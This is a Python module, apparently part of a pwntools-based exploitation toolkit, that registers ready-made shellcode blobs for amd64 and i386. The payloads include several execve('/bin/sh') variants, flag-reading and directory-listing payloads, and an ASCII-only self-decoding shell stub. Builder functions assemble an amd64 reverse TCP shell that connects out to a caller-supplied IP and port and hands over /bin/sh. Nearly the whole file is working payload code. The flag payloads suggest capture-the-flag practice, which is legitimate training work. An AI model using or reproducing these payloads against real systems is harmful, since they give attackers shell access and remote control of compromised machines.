#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from __future__ import annotations
from dataclasses import dataclass, field
from typing import Dict, Iterable, Optional, Tuple, Union, Literal
from pwn import pack  # kept for sockaddr builder
import ipaddress

__all__ = [
    "Arch",
    "Shellcode",
    "ShellcodeStore",
    "SHELLCODESTORE",
    "ShellcodeBuilder",
    "hex_shellcode",
    "build_sockaddr_in",
]

# CORE TYPES
# --------------------------------------------------------------------------------------
from .ctx import Arch	# Arch = Literal["amd64", "i386", "arm", "aarch64"]
Chars = Union[str, bytes]

@dataclass(frozen=True)
class Shellcode:
    """
    A small, typed container for a shellcode blob.
    - name: identifier, e.g., 'execve_bin_sh', 'reverse_tcp_shell'
    - arch: "amd64" / "i386" / ...
    - blob: the shellcode bytes
    - desc: short description shown in listings
    """
    name: str
    arch: Arch
    blob: bytes
    desc: str = ""

@dataclass
class ShellcodeStore:
    """
    Registry of shellcodes.

    Usage:
        sc = SHELLCODESTORE.get("amd64", "execve_bin_sh").blob
    """
    _items: Dict[Tuple[Arch, str], Shellcode] = field(default_factory=dict, init=False, repr=False)

    def register(self, sc: Shellcode) -> None:
        """Add a new shellcode into the registry, keyed by (arch, name)."""
        key = (sc.arch, sc.name)
        if key in self._items:
            raise ValueError(f"Shellcode already registered: {key}")
        self._items[key] = sc

    def get(self, arch: Arch, name: str) -> Shellcode:
        """Fetch a previously registered shellcode by architecture and name."""
        try:
            return self._items[(arch, name)]
        except KeyError:
            raise KeyError(f"No shellcode for ({arch}, {name!r})")

    def names(self, arch: Optional[Arch] = None) -> Iterable[str]:
        """List all registered shellcode names (optionally filtered by architecture)."""
        if arch is None:
            return (f"{a}:{n}" for (a, n) in self._items.keys())
        return (n for (a, n) in self._items.keys() if a == arch)

# UTILS
# --------------------------------------------------------------------------------------
def hex_shellcode(shellcode: Chars) -> str:
    """
    Convert bytes (or latin-1 str) to '\\x..' form.
    e.g.,
        >>> hex_shellcode(b"\\x90\\x90\\xcc")
        '\\x90\\x90\\xcc'
        >>> hex_shellcode("ABC")   # latin-1 string
        '\\x41\\x42\\x43'
    """
    if isinstance(shellcode, str):
        shellcode = shellcode.encode("latin-1")
    return "".join(f"\\x{b:02x}" for b in shellcode)

def build_sockaddr_in(ip: str, port: int) -> bytes:
    """
    Build a 16-byte sockaddr_in buffer for connect().

        struct sockaddr_in {
            sa_family_t    sin_family; // 2 bytes
            in_port_t      sin_port;   // 2 bytes (big-endian)
            struct in_addr sin_addr;   // 4 bytes (big-endian)
            unsigned char  sin_zero[8];// 8 bytes padding
        };

    Example:
        >>> build_sockaddr_in("127.0.0.1", 4444)
        b'\\x02\\x00\\x11\\\\\\x7f\\x00\\x00\\x01' + b'\\x00' * 8
    """
    try:
        addr = ipaddress.IPv4Address(ip)
    except Exception as e:
        raise ValueError(f"Invalid IPv4 address: {ip!r}") from e
    if not (0 <= port <= 65535):
        raise ValueError(f"Port out of range: {port}")

    # AF_INET (2, little), port (big), addr (big), zero padding (64 bits)
    return (
        pack(2,  word_size=16, endianness="little")
        + pack(port, word_size=16, endianness="big")
        + pack(int(addr), word_size=32, endianness="big")
        + pack(0, word_size=64)
    )

# Registry population
# --------------------------------------------------------------------------------------
SHELLCODESTORE = ShellcodeStore()

# - amd64 blobs
_AMD64_EXECVE_BIN_SH_27 = (
    b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91"
    b"\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
    b"\x54\x5f\x99\x52\x57\x54\x5e\xb0"
    b"\x3b\x0f\x05"
)
_AMD64_EXECVEAT_BIN_SH_29 = (
    b"\x6a\x42\x58\xfe\xc4\x48\x99\x52"
    b"\x48\xbf\x2f\x62\x69\x6e\x2f\x2f"
    b"\x73\x68\x57\x54\x5e\x49\x89\xd0"
    b"\x49\x89\xd2\x0f\x05"
)
_AMD64_CAT_FLAG = (
    b"\x48\xb8\x01\x01\x01\x01\x01\x01"
    b"\x01\x01\x50\x48\xb8\x2e\x66\x6c"
    b"\x61\x67\x01\x01\x01\x48\x31\x04"
    b"\x24\x6a\x02\x58\x48\x89\xe7\x31"
    b"\xf6\x99\x0f\x05\x41\xba\xff\xff"
    b"\xff\x7f\x48\x89\xc6\x6a\x28\x58"
    b"\x6a\x01\x5f\x99\x0f\x05"
)
_AMD64_LS_CURDIR = (
    b"\x68\x2f\x2e\x01\x01\x81\x34\x24"
    b"\x01\x01\x01\x01\x48\x89\xe7\x31"
    b"\xd2\xbe\x01\x01\x02\x01\x81\xf6"
    b"\x01\x01\x03\x01\x6a\x02\x58\x0f"
    b"\x05\x48\x89\xc7\x31\xd2\xb6\x03"
    b"\x48\x89\xe6\x6a\x4e\x58\x0f\x05"
    b"\x6a\x01\x5f\x31\xd2\xb6\x03\x48"
    b"\x89\xe6\x6a\x01\x58\x0f\x05"
)

SHELLCODESTORE.register(Shellcode("execve_bin_sh",   "amd64", _AMD64_EXECVE_BIN_SH_27,   "execve('/bin/sh')"))
SHELLCODESTORE.register(Shellcode("execveat_bin_sh", "amd64", _AMD64_EXECVEAT_BIN_SH_29, "execveat('/bin/sh')"))
SHELLCODESTORE.register(Shellcode("cat_flag",        "amd64", _AMD64_CAT_FLAG,           "cat ./flag"))
SHELLCODESTORE.register(Shellcode("ls_current_dir",  "amd64", _AMD64_LS_CURDIR,          "ls $PWD"))

# - i386 blobs
_I386_EXECVE_BIN_SH_21 = (
    b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f"
    b"\x73\x68\x68\x2f\x62\x69\x6e\x89"
    b"\xe3\x31\xc9\xcd\x80"
)
_I386_EXECVE_BIN_SH_23 = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\xb0\x0b\xcd\x80"
)
_I386_EXECVE_BIN_SH_28 = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x89"
    b"\xc1\x89\xc2\xb0\x0b\xcd\x80\x31"
    b"\xc0\x40\xcd\x80"
)
_I386_EXECVE_BIN_SH_33 = (
    b"\x6a\x0b\x58\x99\x52\x66\x68\x2d"
    b"\x70\x89\xe1\x52\x6a\x68\x68\x2f"
    b"\x62\x61\x73\x68\x2f\x62\x69\x6e"
    b"\x89\xe3\x52\x51\x53\x89\xe1\xcd"
    b"\x80"
)
_I386_EXECVE_BIN_SH_49 = (
    b"\xeb\x18\x5e\x31\xc0\x88\x46\x09"
    b"\x89\x76\x0a\x89\x46\x0e\xb0\x0b"
    b"\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e"
    b"\xcd\x80\xe8\xe3\xff\xff\xff\x2f"
    b"\x62\x69\x6e\x2f\x64\x61\x73\x68"
    b"\x41\x42\x42\x42\x42\x43\x43\x43"
    b"\x43"
)
_I386_CAT_FLAG = (
    b"\x6a\x67\x68\x2f\x66\x6c\x61\x89"
    b"\xe3\x31\xc9\x31\xd2\x6a\x05\x58"
    b"\xcd\x80\x6a\x01\x5b\x89\xc1\x31"
    b"\xd2\x68\xff\xff\xff\x7f\x5e\x31"
    b"\xc0\xb0\xbb\xcd\x80"
)
_I386_LS_CURDIR = (
    b"\x68\x01\x01\x01\x01\x81\x34\x24"
    b"\x2f\x2e\x01\x01\x89\xe3\xb9\xff"
    b"\xff\xfe\xff\xf7\xd1\x31\xd2\x6a"
    b"\x05\x58\xcd\x80\x89\xc3\x89\xe1"
    b"\x31\xd2\xb6\x02\x31\xc0\xb0\x8d"
    b"\xcd\x80\x6a\x01\x5b\x89\xe1\x31"
    b"\xd2\xb6\x02\x6a\x04\x58\xcd\x80"
)

SHELLCODESTORE.register(Shellcode("execve_bin_sh_21", "i386", _I386_EXECVE_BIN_SH_21, "execve('/bin/sh') variant 21"))
SHELLCODESTORE.register(Shellcode("execve_bin_sh_23", "i386", _I386_EXECVE_BIN_SH_23, "execve('/bin/sh') variant 23"))
SHELLCODESTORE.register(Shellcode("execve_bin_sh_28", "i386", _I386_EXECVE_BIN_SH_28, "execve('/bin/sh') variant 28"))
SHELLCODESTORE.register(Shellcode("execve_bin_sh_33", "i386", _I386_EXECVE_BIN_SH_33, "execve('/bin/sh') variant 33"))
SHELLCODESTORE.register(Shellcode("execve_bin_sh_49", "i386", _I386_EXECVE_BIN_SH_49, "execve('/bin/sh') variant 49"))
SHELLCODESTORE.register(Shellcode("cat_flag",         "i386", _I386_CAT_FLAG,         "cat ./flag"))
SHELLCODESTORE.register(Shellcode("ls_current_dir",   "i386", _I386_LS_CURDIR,        "ls $PWD"))

# SHELLCODE BUILDERS
# --------------------------------------------------------------------------------------
@dataclass
class ShellcodeBuilder:
    """Composable shellcode factory with arch-aware helpers."""
    arch: Arch

    def build_alpha_shellcode(
        self,
        reg: Literal["rax","rbx","rcx","rdx","rdi","rsi","rsp","rbp"]
    ) -> bytes:
        """
        Build an ASCII-only (alphanumeric/printable) self-decoding shellcode stub.
        (Currently only wired for amd64.)
        """
        if self.arch == "amd64":
            reg_seed = {
                "rax": b"P", "rbx": b"S", "rcx": b"Q", "rdx": b"R",
                "rdi": b"W", "rsi": b"V", "rsp": b"T", "rbp": b"U",
            }
            try:
                seed = reg_seed[reg]
            except KeyError:
                raise ValueError(f"Unsupported reg {reg!r}; choose one of {sorted(reg_seed.keys())}")

            # ASCII decoder blob + execve("/bin/sh") payload (kept as-is)
            alpha = (
                b"h0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02"
                b"DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n"
                b"060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l"
                b"1n0J0h0a070t"
            )
            return seed + alpha

        if self.arch == "i386":
            raise NotImplementedError("ASCII-only i386 stub not implemented yet")

        raise NotImplementedError(f"Unsupported arch: {self.arch}")

    def build_reverse_tcp_connect(self, ip: str, port: int) -> bytes:
        """
        amd64: socket(AF_INET, SOCK_STREAM, 0) → connect(sock, (ip,port), 16)
        (i386 variant not wired here yet)
        """
        if self.arch != "amd64":
            raise NotImplementedError("reverse-tcp connect only implemented for amd64")
        if not (0 <= port <= 0xFFFF):
            raise ValueError("port must be 0..65535")
        ip_be   = ipaddress.IPv4Address(ip).packed
        port_be = port.to_bytes(2, "big")

        prefix = (
            b"\x6a\x29\x58\x99"          # push 41; pop rax; cdq
            b"\x6a\x02\x5f"              # AF_INET
            b"\x6a\x01\x5e"              # SOCK_STREAM
            b"\x0f\x05"                  # syscall (socket)
            b"\x97"                      # xchg eax, edi
            b"\xb0\x2a"                  # mov al, 42 (SYS_connect)
            b"\x48\xb9\x02\x00"          # mov rcx, 0x0000???:??0002
        )
        suffix = b"\x51\x54\x5e\xb2\x10\x0f\x05"  # push rcx; push rsp; pop rsi; mov dl,16; syscall
        return prefix + port_be + ip_be + suffix

    def build_reverse_tcp_shell(self, ip: str, port: int) -> bytes:
        """
        amd64: socket → connect(ip,port) → dup2(sock,0..2) → execve('/bin/sh')
        (i386 variant not wired here yet)
        """
        if self.arch != "amd64":
            raise NotImplementedError("reverse-tcp shell only implemented for amd64")
        if not (0 <= port <= 0xFFFF):
            raise ValueError("port must be 0..65535")
        ip_be   = ipaddress.IPv4Address(ip).packed
        port_be = port.to_bytes(2, "big")

        prefix = (
            b"\x6a\x29\x58\x99"
            b"\x6a\x02\x5f"
            b"\x6a\x01\x5e"
            b"\x0f\x05"
            b"\x97"
            b"\xb0\x2a"
            b"\x48\xb9\x02\x00"
        )
        connect_suffix = b"\x51\x54\x5e\xb2\x10\x0f\x05"
        dup2_loop = (
            b"\x6a\x03\x5e"                    # push 3; pop rsi
            b"\xb0\x21\xff\xce\x0f\x05\x75\xf8"  # dup2 loop: mov al,33; dec esi; syscall; jnz
        )
        execve_binsh = (
            b"\x99\xb0\x3b"                        # cdq; mov al,59
            b"\x52"                                # push rdx
            b"\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # "/bin/sh\x00"
            b"\x51\x54\x5f\x0f\x05"                # push rcx; push rsp; pop rdi; syscall
        )
        return prefix + port_be + ip_be + connect_suffix + dup2_loop + execve_binsh


if __name__ == "__main__":
    # tiny smoke: hex rendering + list registered names
    print(hex_shellcode(b"AB\x00C"))
    print(sorted(SHELLCODESTORE.names()))

